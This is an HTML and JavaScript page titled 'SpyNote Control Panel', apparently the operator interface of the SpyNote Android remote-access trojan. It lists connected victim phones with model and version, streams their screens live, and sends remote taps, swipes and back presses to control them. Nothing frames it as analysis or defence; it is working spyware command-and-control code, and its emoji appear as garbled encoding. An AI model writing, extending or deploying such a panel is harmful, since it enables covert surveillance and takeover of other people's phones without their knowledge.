<!DOCTYPE html>
<html>
<head>
    <title>SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; 
            height: 100vh;
            overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); 
            padding: 15px; 
            max-height: 80vh; 
            overflow-y: auto; 
            width: 250px; 
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        .device {
            padding: 12px; margin: 8px 0; 
            background: #333; 
            cursor: pointer; 
            border-radius: 8px; 
            transition: all 0.3s;
        }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }
        .disconnected { opacity: 0.5; }

        #phone-frame {
            width: 400px; height: 800px; 
            margin: 20px auto; 
            background: #000; 
            border: 25px solid #333; 
            border-radius: 50px; 
            position: relative; 
            cursor: pointer; 
            touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; 
            background: #111; 
            border-radius: 20px;
            image-rendering: -webkit-optimize-contrast;
        }
        #controls { 
            text-align: center; 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
        }
        button {
            padding: 15px 30px; margin: 0 10px; 
            background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; 
            border-radius: 25px; cursor: pointer; 
            font-size: 16px; font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
        button:active { transform: translateY(0); }
        
        #status {
            position: fixed; top: 10px; right: 10px;
            background: rgba(0,0,0,0.8); padding: 10px; border-radius: 5px;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3>ðŸ“± Connected Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>Selected: <span id="selectedDevice">-</span></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleFullScreen()">ðŸ“± Fullscreen</button>
    </div>

  <script>
    const socket = io();
    let currentDevice = null;
    let deviceWidth = 1080, deviceHeight = 1920;

    const canvas = document.getElementById('screen');
    const ctx = canvas.getContext('2d');
    const phoneFrame = document.getElementById('phone-frame');
    const deviceList = document.getElementById('device-list');
    const connectionStatus = document.getElementById('connectionStatus');
    const selectedDevice = document.getElementById('selectedDevice');

    // âœ… FIXED: Canvas resize to match phone frame
    function resizeCanvas() {
        const rect = phoneFrame.getBoundingClientRect();
        canvas.width = rect.width;
        canvas.height = rect.height;
        canvas.style.width = rect.width + 'px';
        canvas.style.height = rect.height + 'px';
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    socket.on('connect', () => {
        connectionStatus.textContent = 'Connected âœ…';
        connectionStatus.style.color = '#00ff88';
    });

    socket.on('devices-update', (devices) => {
        updateDeviceList(devices);
    });

    // âœ… FIXED: PROPER SCREEN RENDERING
    socket.on('screen-frame', (data) => {
        if (data.deviceId === currentDevice && data.data) {
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                // âœ… PERFECT SCALING
                const rect = phoneFrame.getBoundingClientRect();
                const scaleX = rect.width / deviceWidth;
                const scaleY = rect.height / deviceHeight;
                const scale = Math.min(scaleX, scaleY);
                
                const drawWidth = deviceWidth * scale;
                const drawHeight = deviceHeight * scale;
                const offsetX = (rect.width - drawWidth) / 2;
                const offsetY = (rect.height - drawHeight) / 2;
                
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.imageSmoothingEnabled = true;
                ctx.imageSmoothingQuality = 'high';
                ctx.drawImage(img, offsetX, offsetY, drawWidth, drawHeight);
                
                console.log(`âœ… Screen rendered: ${deviceWidth}x${deviceHeight}`);
            };
            
            img.onerror = (e) => {
                console.error('Image error:', e);
            };
            
            img.src = 'data:image/jpeg;base64,' + data.data;
        }
    });

    // Initial devices
    fetch('/devices').then(r => r.json()).then(updateDeviceList);

    function updateDeviceList(devices) {
        deviceList.innerHTML = devices.length ? 
            devices.map(([id, info]) => `
                <div class="device ${!info.connected ? 'disconnected' : ''}" 
                     onclick="selectDevice('${id}', this)">
                    <b>${info.model || id.slice(0,8)}</b><br>
                    <small>${info.brand || ''} ${info.version || ''}</small>
                    ${info.connected ? 'ðŸŸ¢ LIVE' : 'ðŸ”´ OFF'}
                </div>
            `).join('') : 'No devices connected';
    }

    function selectDevice(deviceId, el) {
        currentDevice = deviceId;
        selectedDevice.textContent = deviceId.slice(0,8);
        document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
        el.classList.add('active');
        socket.emit('control', { deviceId });
        resizeCanvas();
    }

    // Touch/Mouse Controls (ALREADY WORKING)
    let startX = 0, startY = 0, dragging = false;

    function getScaledCoords(clientX, clientY) {
        const rect = phoneFrame.getBoundingClientRect();
        const scaleX = deviceWidth / rect.width;
        const scaleY = deviceHeight / rect.height;
        return {
            x: (clientX - rect.left) * scaleX,
            y: (clientY - rect.top) * scaleY
        };
    }

    ['mousedown', 'touchstart'].forEach(event => {
        phoneFrame.addEventListener(event, e => {
            e.preventDefault();
            dragging = true;
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            startX = coords.x;
            startY = coords.y;
            sendTap(startX, startY);
        });
    });

    ['mousemove', 'touchmove'].forEach(event => {
        phoneFrame.addEventListener(event, e => {
            if (!dragging || !currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            sendSwipe(startX, startY, coords.x, coords.y);
        });
    });

    ['mouseup', 'touchend'].forEach(event => {
        phoneFrame.addEventListener(event, e => {
            dragging = false;
        });
    });

    function sendTap(x, y) {
        if (!currentDevice) return;
        socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
    }

    function sendSwipe(sx, sy, ex, ey) {
        if (!currentDevice) return;
        socket.emit('control', { 
            deviceId: currentDevice, 
            action: 'swipe', 
            startX: sx, startY: sy, 
            endX: ex, endY: ey 
        });
    }

    function sendBack() {
        if (!currentDevice) return;
        socket.emit('control', { deviceId: currentDevice, action: 'back' });
    }

    function toggleFullScreen() {
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen();
        } else {
            document.exitFullscreen();
        }
    }
</script>
</body>
</html>
